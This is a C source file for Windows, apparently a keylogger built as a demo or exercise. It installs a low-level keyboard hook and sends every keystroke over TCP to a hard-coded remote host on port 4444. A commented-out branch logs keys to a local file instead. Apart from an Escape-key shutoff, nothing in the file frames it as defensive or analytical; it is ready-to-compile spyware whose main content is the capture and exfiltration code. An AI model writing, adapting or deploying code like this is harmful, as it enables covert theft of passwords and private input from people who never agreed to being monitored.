#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <winsock2.h>

#pragma comment(lib, "Ws2_32.lib")

HHOOK hook;
LPMSG msg;
bool runThread = true;
SOCKET sock;

LRESULT CALLBACK KeyboardProc(int code , WPARAM wParam, LPARAM lParam){
    if(code == HC_ACTION && wParam == WM_KEYDOWN){
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
       
        if(p->vkCode == VK_ESCAPE){
            runThread = false;
            UnhookWindowsHookEx(hook);
            printf("hooking disabled by esc key. meow =^..^=\n");
            PostQuitMessage(0);
            return 0;
        } 
    
       /* FILE* fp = fopen("keylog.txt", "a+");
        if(fp){
            DWORD key = p->vkCode;
            fprintf(fp, "key pressed: %c\n", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
            fclose(fp);      
        }*/

        char buffer[256];
        DWORD key = p->vkCode;
        char ch = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
        snprintf(buffer, sizeof(buffer), "key pressed: %c\n", ch);
        send(sock, buffer, strlen(buffer), 0);
    }
    return CallNextHookEx(hook, code, wParam, lParam);

}


bool initSocket(const char* ip,int port){
    WSADATA wsa;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return false;
    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET){
        printf("Failed to create socket. Error Code: %d\n", WSAGetLastError());
        return false;
    }
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
        printf("Failed to connect to server. Error Code: %d\n", WSAGetLastError());
        return false;
    }
    printf("Connected");
    return true;
}



int main(int argc,char* argv[]){
    MSG msg;
    const char* ip = "192.168.1.100";
    int port = 4444;
    
    if(!initSocket(ip, port)){
       // printf("Failed to initialize socket\n");
        return 1;
    }


    // install the hook - using the WH_KEYBOARD_LL action
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
  
     
    if(hook == NULL){
        printf("Failed to install hook!\n");
        return 1;
    }

    printf("Hook installed successfully!\n");
    while(runThread && GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}